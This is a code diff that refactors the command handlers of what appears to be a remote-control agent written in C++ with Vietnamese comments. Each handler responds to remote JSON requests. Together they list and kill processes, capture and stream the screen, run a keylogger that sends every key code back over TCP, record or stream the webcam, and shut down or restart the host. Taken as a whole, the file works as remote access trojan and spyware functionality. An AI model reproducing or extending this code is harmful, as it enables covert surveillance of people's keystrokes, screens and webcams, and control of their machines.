@@ -1,234 +1,155 @@
 #include "ProcessHandlers.h"
+#include "ProcessManager.h"
 #include "AgentTcpServer.h"
+#include "Capture.h"
+#include "ScreenStream.h"
+#include "Keylogging.h"
+#include "WebcamRecord.h"
+#include "WebcamStream.h"
 
-// === PROCESS HANDLERS ===
+// Helper: Trả về JSON status chuẩn
+json ProcessHandlers::makeStatus(bool success, const std::string& msg, json extra) {
+    json j = {{"type", "status"}, {"success", success}};
+    if (!msg.empty()) j["message"] = msg;
+    if (!extra.empty()) j.update(extra);
+    return j;
+}
 
-json ProcessHandlers::listProcesses(const json &)
-{
-    auto list = ProcessManager::listProcesses();
+// === PROCESS ===
+json ProcessHandlers::listProcesses(const json&) {
     json arr = json::array();
-
-    for (auto &p : list)
-        arr.push_back({{"pid", p.pid},
-                       {"name", p.name},
-                       {"workingSet", p.workingSet},
-                       {"exePath", p.exePath}});
-
+    for (const auto& p : ProcessManager::listProcesses()) {
+        arr.push_back({
+            {"pid", p.pid}, {"name", p.name},
+            {"workingSet", p.workingSet}, {"exePath", p.exePath}
+        });
+    }
     return {{"type", "process_list"}, {"data", arr}};
 }
 
-json ProcessHandlers::startProcess(const json &req)
-{
+json ProcessHandlers::startProcess(const json& req) {
     std::string path = req.value("path", "");
-    std::string args = req.value("args", "");
-    if (path.empty())
-        return {{"type", "status"}, {"success", false}, {"message", "missing path"}};
+    if (path.empty()) return makeStatus(false, "missing path");
 
-    unsigned long pid{};
-    bool ok = ProcessManager::startProcess(path, args, &pid);
-    return {{"type", "status"}, {"success", ok}, {"pid", pid}};
+    unsigned long pid = 0;
+    bool ok = ProcessManager::startProcess(path, req.value("args", ""), &pid);
+    return makeStatus(ok, "", {{"pid", pid}});
 }
 
-json ProcessHandlers::stopProcessPid(const json &req)
-{
-    if (!req.contains("pid"))
-        return {{"type", "status"}, {"success", false}, {"message", "missing pid"}};
-
-    bool ok = ProcessManager::stopProcessByPid(req["pid"]);
-    return {{"type", "status"}, {"success", ok}};
+json ProcessHandlers::stopProcessPid(const json& req) {
+    if (!req.contains("pid")) return makeStatus(false, "missing pid");
+    return makeStatus(ProcessManager::stopProcessByPid(req["pid"]));
 }
 
-// === APPLICATION HANDLERS ===
-
-json ProcessHandlers::listApps(const json &)
-{
-    auto apps = ProcessManager::listUserApplications();
+// === APPS ===
+json ProcessHandlers::listApps(const json&) {
     json arr = json::array();
-
-    for (auto &a : apps)
+    for (const auto& a : ProcessManager::listUserApplications()) {
         arr.push_back({{"name", a.name}, {"process_count", a.processCount}});
-
+    }
     return {{"type", "application_list"}, {"data", arr}};
 }
 
-json ProcessHandlers::startApp(const json &req)
-{
+json ProcessHandlers::startApp(const json& req) {
     std::string name = req.value("app_name", "");
-    if (name.empty())
-        return {{"type", "status"}, {"success", false}, {"message", "missing app_name"}};
+    if (name.empty()) return makeStatus(false, "missing app_name");
 
-    unsigned long pid{};
+    unsigned long pid = 0;
     bool ok = ProcessManager::startProcess(name, "", &pid);
-    return {{"type", "status"}, {"success", ok}, {"pid", pid}};
+    return makeStatus(ok, "", {{"pid", pid}});
 }
 
-json ProcessHandlers::stopApp(const json &req)
-{
-    std::string name = req.value("app_name", "");
-    int stop = ProcessManager::stopProcessesByName(name);
-    return {{"type", "status"}, {"success", stop > 0}, {"stopped", stop}};
+json ProcessHandlers::stopApp(const json& req) {
+    int count = ProcessManager::stopProcessesByName(req.value("app_name", ""));
+    return makeStatus(count > 0, "", {{"stopped", count}});
 }
 
-// === SCREEN HANDLERS ===
-
-json ProcessHandlers::captureScreen(const json &)
-{
+// === SCREEN ===
+json ProcessHandlers::captureScreen(const json&) {
     std::string b64 = capture_screenshot_base64();
-    if (b64.empty())
-        return {{"type", "status"}, {"success", false}, {"message", "capture failed"}};
-
+    if (b64.empty()) return makeStatus(false, "capture failed");
     return {{"type", "screenshot"}, {"success", true}, {"data", b64}};
 }
 
-json ProcessHandlers::startScreenStream(const json &req)
-{
-    int fps = req.value("fps", 15);
-    ScreenStream::start(fps);
-
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "Screen streaming started"}};
+json ProcessHandlers::startScreenStream(const json& req) {
+    ScreenStream::start(req.value("fps", 15));
+    return makeStatus(true, "Screen streaming started");
 }
 
-json ProcessHandlers::stopScreenStream(const json &)
-{
+json ProcessHandlers::stopScreenStream(const json&) {
     ScreenStream::stop();
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "Screen streaming stopped"}};
+    return makeStatus(true, "Screen streaming stopped");
 }
 
-// === KEYLOGGER HANDLERS ===
-
-json ProcessHandlers::startKeylog(const json &)
-{
-    // Đăng ký callback gửi phím lên Gateway
-    setKeyEventCallback([](int key)
-                        {
-        json msg = {
-            {"type","key_event"},
+// === KEYLOGGER ===
+json ProcessHandlers::startKeylog(const json&) {
+    // Đăng ký callback trực tiếp vào class Keylogging
+    Keylogging::setCallback([](int key) {
+        AgentTcpServer::instance().sendJson({
+            {"type", "key_event"}, 
             {"key_code", key}
-        };
-        AgentTcpServer::instance().sendJson(msg); });
-
-    startKeylogger();
-
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "Keylogger started"}};
+        });
+    });
+    
+    Keylogging::start();
+    return makeStatus(true, "Keylogger started");
 }
 
-json ProcessHandlers::stopKeylog(const json &)
-{
-    stopKeylogger();
-    return {{"type", "status"}, {"success", true}, {"message", "Keylogger stopped"}};
+json ProcessHandlers::stopKeylog(const json&) {
+    Keylogging::stop();
+    return makeStatus(true, "Keylogger stopped");
 }
 
-// === WEBCAM RECORD HANDLERS ===
-
-json ProcessHandlers::startWebcamRecord(const json &req)
-{
+// === WEBCAM ===
+json ProcessHandlers::startWebcamRecord(const json& req) {
     int time = req.value("time", 10);
+    auto& server = AgentTcpServer::instance();
 
-    // Gửi trạng thái bắt đầu ghi hình
-    json status_msg = {
-        {"type", "webcam_recording_status"},
-        {"message", "Recording started. Duration: " + std::to_string(time) + "s"}};
-    AgentTcpServer::instance().sendJson(status_msg);
+    server.sendJson({{"type", "webcam_recording_status"}, 
+                     {"message", "Recording started (" + std::to_string(time) + "s)"}});
 
-    // Ghi hình (blocking call)
     std::string b64 = WebcamRecord::record_base64(time);
-
-    // Gửi trạng thái thất bại nếu ghi hình lỗi
-    if (b64.empty())
-    {
-        json failed_msg = {
-            {"type", "webcam_recording_status"},
-            {"message", "Recording failed"}};
-        AgentTcpServer::instance().sendJson(failed_msg);
-        return {{"type", "status"}, {"success", false}, {"message", "record failed"}};
+    
+    if (b64.empty()) {
+        server.sendJson({{"type", "webcam_recording_status"}, {"message", "Recording failed"}});
+        return makeStatus(false, "record failed");
     }
 
-    // Gửi video đã mã hóa base64
-    json video_msg = {
-        {"type", "webcam_video"},
-        {"success", true},
-        {"data", b64}};
-    AgentTcpServer::instance().sendJson(video_msg);
-
-    return {{"type", "status"}, {"success", true}, {"message", "Webcam video sent."}};
+    server.sendJson({{"type", "webcam_video"}, {"success", true}, {"data", b64}});
+    return makeStatus(true, "Webcam video sent");
 }
 
-// Hiện tại không thể dừng giữa chừng vì record_base64 là blocking
-json ProcessHandlers::stopWebcamRecord(const json &)
-{
-    json status_msg = {
-        {"type", "webcam_recording_status"},
-        {"message", "Recording cancelled (client request)"}};
-    AgentTcpServer::instance().sendJson(status_msg);
-    return {{"type", "status"}, {"success", true}, {"message", "Webcam stop signal sent."}};
+json ProcessHandlers::stopWebcamRecord(const json&) {
+    AgentTcpServer::instance().sendJson({
+        {"type", "webcam_recording_status"}, 
+        {"message", "Recording cancelled"}
+    });
+    return makeStatus(true, "Stop signal sent");
 }
 
-// === WEBCAM STREAM HANDLERS ===
-
-json ProcessHandlers::startWebcamStream(const json &req)
-{
-    int fps = req.value("fps", 30);
-    WebcamStream::start(fps);
-
-    json status_msg = {
-        {"type", "webcam_recording_status"},
-        {"message", "Webcam streaming started"}};
-    AgentTcpServer::instance().sendJson(status_msg);
-
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "Webcam streaming started"}};
+json ProcessHandlers::startWebcamStream(const json& req) {
+    WebcamStream::start(req.value("fps", 30));
+    AgentTcpServer::instance().sendJson({
+        {"type", "webcam_recording_status"}, {"message", "Webcam streaming started"}
+    });
+    return makeStatus(true, "Webcam streaming started");
 }
 
-json ProcessHandlers::stopWebcamStream(const json &)
-{
+json ProcessHandlers::stopWebcamStream(const json&) {
     WebcamStream::stop();
-
-    json status_msg = {
-        {"type", "webcam_recording_status"},
-        {"message", "Webcam streaming stopped"}};
-    AgentTcpServer::instance().sendJson(status_msg);
-
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "Webcam streaming stopped"}};
+    AgentTcpServer::instance().sendJson({
+        {"type", "webcam_recording_status"}, {"message", "Webcam streaming stopped"}
+    });
+    return makeStatus(true, "Webcam streaming stopped");
 }
 
-// === SYSTEM CONTROL HANDLERS ===
-
-json ProcessHandlers::systemShutdown(const json &)
-{
-#ifdef _WIN32
+// === SYSTEM ===
+json ProcessHandlers::systemShutdown(const json&) {
     std::system("shutdown /s /t 0");
-#else
-    std::system("shutdown now");
-#endif
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "System shutdown command sent."}};
+    return makeStatus(true, "Shutdown command sent");
 }
 
-json ProcessHandlers::systemRestart(const json &)
-{
-#ifdef _WIN32
+json ProcessHandlers::systemRestart(const json&) {
     std::system("shutdown /r /t 0");
-#else
-    std::system("reboot");
-#endif
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "System restart command sent."}};
+    return makeStatus(true, "Restart command sent");
 }
